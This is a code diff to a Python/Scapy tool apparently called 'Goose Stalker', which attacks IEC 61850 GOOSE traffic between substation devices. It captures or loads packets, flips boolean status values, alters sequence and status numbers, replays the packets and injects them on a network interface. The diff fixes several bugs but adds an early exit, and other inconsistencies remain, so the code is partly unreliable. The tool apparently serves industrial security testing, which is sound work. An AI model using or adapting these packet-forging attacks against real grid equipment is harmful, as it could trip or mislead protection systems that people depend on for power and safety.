@@ -19,11 +19,11 @@ filetime       = datetime.datetime.fromtimestamp(int(time.time())).strftime('%Y%
 p_args = argparse.ArgumentParser(description='CutSec: Goose Stalker')
 p_args.add_argument('-D', '--debug',action='count',default=0,dest='DEBUG',help='Turn on debugging level: -D normal, -DD verbose')
 p_args.add_argument('-f', '--infile',dest='infPcap')
-p_args.add_argument('-o', '--outfile',default='/tmp/goose_mod_' + filetime '.pcap',dest='onfPcap') 
+p_args.add_argument('-o', '--outfile',default='/tmp/goose_mod_' + filetime + '.pcap',dest='onfPcap') 
 p_args.add_argument('-L', '--device-list',nargs='*',default=[],dest='deviceNames',help='List of device names to limit interactions: C60_Device1 C60-Device2 D60-Device3 SEL-Device4')
 p_args.add_argument('-iI','--cap',default='eth0',dest='capInterface')
 p_args.add_argument('-oI','--send',default='eth0',dest='sndInterface')
-p_args.add_argument('-t', '--update-time',action=False,dest='setTime')
+p_args.add_argument('-t', '--update-time',action='store_false',dest='setTime')
 p_args.add_argument('-d', '--delay',default=60,dest='resendTimeDelay')
 p_args.add_argument('-F', '--flip-booleans',action='store_true',dest='flipBooleans')
 # Attacks
@@ -35,12 +35,30 @@ def signal_handler(sig,frame):
     print('Manual interrupt captured: cntl-c')
     sys.exit()
 
+def timeToString(t):
+    if args.DEBUG: print('In timeToString')
+    time32Int = int.from_bytes(t[:4],'big')
+    time32Str = datetime.fromtimestamp(time32Int).strftime('%Y-%m-%d %H:%M:%S')
+    return time32Str
+
+def curTimeBytes(utc=False):
+    if args.DEBUG: print('In curTimeBytes')
+    if utc:
+        curTime = time.mktime(datetime.utcnow().timetuple())
+    else:
+        curTime = time.mktime(datetime.now().timetuple())
+    curTimeInt = int(curTime)
+    curTimeInt64 = (curTimeInt << 32)
+    curTimeInt64Str = curTimeInt64.to_bytes(8,'big')
+    return curTimeInt64Str
+
+
 def scapyWrite(pkt):
     if args.DEBUG: print('In scapyWrite')
     # Update time, unless told not to
     if args.setTime:
         #t = pkt.getfieldval('t').load
-        pkt.setfieldval('t') = curTimeBytes()
+        pkt.setfieldval('t', curTimeBytes())
     wrpcap(args.onfPcap, pkt, append=True)  #appends packet to output file
 
 def sendPacket(pkt):
@@ -48,20 +66,9 @@ def sendPacket(pkt):
     # Update time, unless told not to
     if args.setTime:
         #t = pkt.getfieldval('t').load
-        pkt.setfieldval('t') = curTimeBytes()
-    sendp(pkt,iface=args.outInterface)
+        pkt.setfieldval('t',curTimeBytes())
+    sendp(pkt,iface=args.sndInterface)
 
-def timeToString(t):
-    if args.DEBUG: print('In timeToString')
-    t4r = struct.unpack('>i',t[:4])[0]
-    ptime = datetime.datetime.fromtimestamp(t4r).strftime('%Y-%m-%d- %H:%M:%S')
-    return ptime
-
-def curTimeBytes():
-    if args.DEBUG: print('In curTimeBytes')
-    curTime = int(time.time())
-    curTimeBytes = struct.pack('>i',curTime)
-    return curTimeBytes
     
 def modPacket(pkt):
     if args.DEBUG: print('In modPacket: %r\n\n'%(pkt))
@@ -87,10 +94,10 @@ def gooseTest(pkt):
     if args.DEBUG: print('In gooseTest')
     isGoose = False
     # Test for a Goose Ether Type
-    if p.haslayer('Dot1Q'):
-        if p[Dot1Q].type == GOOSE_TYPE: isGoose = True
-    if p.haslayer('Ether'):
-        if p[Ether].type == GOOSE_TYPE: isGoose = True
+    if pkt.haslayer('Dot1Q'):
+        if pkt[Dot1Q].type == GOOSE_TYPE: isGoose = True
+    if pkt.haslayer('Ether'):
+        if pkt[Ether].type == GOOSE_TYPE: isGoose = True
     return isGoose
 
 def deviceTest(pkt):
@@ -112,7 +119,7 @@ def status_num_attack(pkts):
     for p in packets:
         if gooseTest(p):
             try:
-                if flipBooleans:
+                if args.flipBooleans:
                     modData = modPacket(p)
                     p.setfieldval('allData',modData)
                     if args.DEBUG > 1: print('modData modded p: %r\n\n'%(p))
@@ -159,7 +166,7 @@ def replay_attack(pkts):
     for p in packets:
         if gooseTest(p):
             try:
-                if flipBooleans:
+                if args.flipBooleans:
                     modData = modPacket(p)
                     p.setfieldval('allData',modData)
                     if args.DEBUG > 1: print('modData modded p: %r\n\n'%(p))
@@ -204,7 +211,7 @@ def sqNum_attack(pkts):
                     sqNumLen = p.getfieldval('sqNumLen')
                     sqNum = (int.from_bytes(sqNum,'big') + 1).to_bytes(sqNumLen,'big')
                     p.setfieldval('sqNum', sqNum)
-                    if DEBUG: print('sqNum set: %r'%(sqNum))
+                    if args.DEBUG: print('sqNum set: %r'%(sqNum))
                     scapyWrite(p)
                 
                 # Handle packet
@@ -224,20 +231,23 @@ if __name__ == "__main__":
     # Allow user to exit program
     signal.signal(signal.SIGINT,signal_handler)
 
+    print('Args: %s'%(args))
+    sys.exit()
+
     # Read packets from packet capture
-    if infPcap:
-        packets = rdpcap(infPcap)
+    if args.infPcap:
+        packets = rdpcap(args.infPcap)
     # Capture packets
     elif capInterface:
         #packets = sniff(iface=capInterface,count=1000,prn=gooseCheck,filter='ether proto 0x88b8',store=False)
-        packets = sniff(iface=capInterface,count=1000,filter='ether proto 0x88b8',store=False)
+        packets = sniff(iface=args.capInterface,count=1000,filter='ether proto 0x88b8',store=False)
     else:
         print('gooseStalker: must select and interface or PCAP file to parse.')
         p_args.print_help()
 
-    if args.attackType = 'replay':
+    if args.attackType == 'replay':
         replay_attack(packets)
-    if args.attackType = 'status':
+    if args.attackType == 'status':
         status_num_attack(packets)
-    if args.attackType = 'sequence':
+    if args.attackType == 'sequence':
         sqNum_attack(packets)
